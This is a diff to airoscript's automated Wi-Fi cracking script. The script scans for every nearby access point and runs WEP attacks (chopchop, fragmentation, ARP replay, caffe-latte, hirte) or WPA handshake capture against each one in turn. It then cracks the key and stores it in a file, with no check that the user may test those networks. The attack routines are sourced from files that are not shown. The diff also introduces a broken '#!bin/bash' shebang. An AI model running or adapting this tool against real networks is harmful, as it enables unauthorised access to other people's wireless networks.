@@ -1,4 +1,4 @@
-#!/bin/bash
+#!bin/bash
 # Autocrack functions file for airoscript.
 
 # Copyright (C) 2011 David Francos Cuartero
@@ -16,29 +16,18 @@
 #        along with this program; if not, write to the Free Software
 #        Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 
-filter_ssid(){
-    sleep 3; echo # ... must be like this for good-looking foo.
-    [[ "$filter_ssid" != "" ]] && {
-        tag; warn "${mark}Filtering essid to $filter_ssid";
-        grep $filter_ssid $DUMP_PATH/dump-02.csv > $DUMP_PATH/dump-03.csv;
-    } || {
-        cp $DUMP_PATH/dump-02.csv $DUMP_PATH/dump-03.csv;
-    }
-}
-
 unknown(){
     ap_array=`cat $DUMP_PATH/dump-01.csv | grep -a -n Station | awk -F : '{print $1}'`
     head -n $ap_array $DUMP_PATH/dump-01.csv &> $DUMP_PATH/dump-02.csv
 }
 
-count_aps(){ a=($(wc -l $DUMP_PATH/dump-03.csv)); echo ${a[0]}; } # benchmarks shows this is a little more efficent than using cut.
+count_aps(){ a=($(wc -l $DUMP_PATH/dump-02.csv)); echo ${a[0]}; } # benchmarks shows this is a little more efficent than using cut.
 
 doauto(){
     source $path/autopwn
     F=0; export AUTO=1; export QUIET=1; export INTERACTIVE=0
     autoscan_autopwn;
     unknown;
-    filter_ssid;
     MAX_TARGETS=$(count_aps);
     echo;
     attack_functions_wep=(wep_attacks_fakeauto wep_attacks_fakeinteractive wep_attacks_chopchop wep_attacks_caffelate wep_attacks_hirte wep_attacks_arpreplay_auto wep_attacks_arpreplay_interactive wep_attacks_fragmentation wep_attacks_chopchopclient wep_attacks_pskarp)
@@ -48,6 +37,7 @@ doauto(){
     for i in `seq 1 $MAX_TARGETS`; do
         tag; warn "${mark}Trying to crack target $i"
         export AUTO=2; selectAp;  sleep 1
+        export writekey="-l $DUMP_PATH/$Host_MAC.key"
         if [ "$Host_SSID" != "" ]; then autopwn; 
         else tag; warn "${mark}Couldn't find essid, next try"; fi
     done
@@ -60,34 +50,43 @@ doauto(){
 }
 
 continue_autocrack(){
-    single_question "Press c to configure, q to quit, any key to continue"
-    [[ "$ans" == "c" ]] && configure; [[ "$ans" == "q" ]] && { check_function doexit || source $path/internal/exit; doexit killme ; }
+    read -p "Press c to configure, q to quit, any key to continue" -n1 ans
+    [[ "$ans" == "c" ]] && configure;
+    [[ $ans == "q" ]] && { 
+        echo;
+        warn "${mark}Exiting..."
+        check_function doexit || source $path/internal/exit; 
+        doexit killme ;
+    }
 }
 
 autopwn(){
     check_function cleanp || source $path/internal/childs
+
     F=0; export AUTO=1; export QUIET=1; export INTERACTIVE=0; next=0;
     sleep 1
     count=0
-    [[ "$Host_ENC" =~ (.*)WPA(.*) ]] && attack_functions=${attack_functions_wpa[@]} || attack_functions=${attack_functions_wep}
+    [[ "$Host_ENC" =~ (.*)WPA(.*) ]] && { attack_functions=${attack_functions_wpa[@]}; min_ivs=10; } || attack_functions=${attack_functions_wep}
 
+    
     for i in ${attack_functions[@]}; do
         tag; echo "${mark}Attack $count. Using $i in $Host_MAC"
-        $i & cleanp & get_current_ivs
+        $i & cleanp & get_min_ivs
         tag; warn "${mark}Needed ivs: $min_ivs"
         while [ "1" ]; do 
             sleep 5 && { 
-                [[ "`check_all_ivs`" -gt "$min_ivs" ]] && { 
-                    echo; warn "${mark}Trying to crack network, we have enough ivs";
+                [[ $(check_if_worked) ]] && { 
+                    echo; warn "${mark}Trying to crack network, we have enough ivs or handshakes.";
                     cleanautovars;
-                    auto autocrack;
+                    auto autocrack
                     cleanautovars;
-                    reset;
-                    echo "${mark}Network cracked, password stored in $DUMP_PATH/$Host_MAC.key"; 
+                    [[ -e $DUMP_PATH/$Host_MAC.key ]] && warn "${mark}Network cracked, password stored in $DUMP_PATH/$Host_MAC.key" || warn "${mark}Network NOT cracked. Something failed, if your enc is WPA probably key is not in your ~/.airoscript/wordlist.txt"
                     continue_autocrack
+                 } || {
+                    specialwarn "\r${mark}Current IVS: `check_all_ivs`"  ;
                 }
             }
-            specialwarn "\r${mark}Current IVS: `check_all_ivs`"  ;
+
         done
         count=$(( $count + 1 ))
     done
@@ -97,25 +96,26 @@ autopwn(){
 
 }
 
-check_all_ivs(){
-    for i in $DUMP_PATH/$Host_MAC*.cap; do
-        cur=`ivstools --convert $i $DUMP_PATH/temporal|awk '/IVs/ {print $2}'`
-        if [ "$cur" = "" ]; then cur=0; fi
-        maxn=$(( $maxn + $cur ))
-    done
-    if [ "$maxn" == "" ]; then echo 0; fi
-    echo $maxn
-}
+check_all_ivs(){  awk "/^$Host_MAC/ { gsub(/,/, \"\", \$13); print \$13; }" ${DUMP_PATH}/${Host_MAC}-01.csv; }
 
-get_current_ivs(){
+get_min_ivs(){
+    [[ "$Host_ENC" =~ (.*)WPA(.*) ]] && {  min_ivs=10; return; }
     auto return_ivs; a=$?
     [[ "$a" == 255 ]] && min_ivs=$autopwn_min_ivs || min_ivs=$a
 }
 
+check_if_handshake(){ # TODO: In docs, add tcpdump as a requirmen # TODO: In docs, add tcpdump as a requirment for this... =(
+    (( $({ tcpdump -r  $DUMP_PATH/$Host_MAC-01.cap  -e ether proto 0x888e|wc -l; } 2>/dev/null ) > 1 ))
+}
+
 check_if_worked(){
-    get_current_ivs
-    echo $'\t' "${mark}Minium ivs required for this network: $min_ivs"
-    civs=`check_all_ivs`; echo $'\t' "${mark}Current IVSs: $civs"
-    if [ "`check_all_ivs`" -gt $min_ivs ]; then echo $'\t' "${mark}It worked, I have $min_ivs =)"; return 0; fi
-    return 1
+    [[ "$Host_ENC" =~ (.*)WPA(.*) ]] && {
+        check_if_handshake && {
+            tag; warn "${mark}Got WPA handshake"
+            return 0
+        } || {
+            return 1;
+        }
+    }
+    get_min_ivs; (( "`check_all_ivs`" > $min_ivs ))
 }
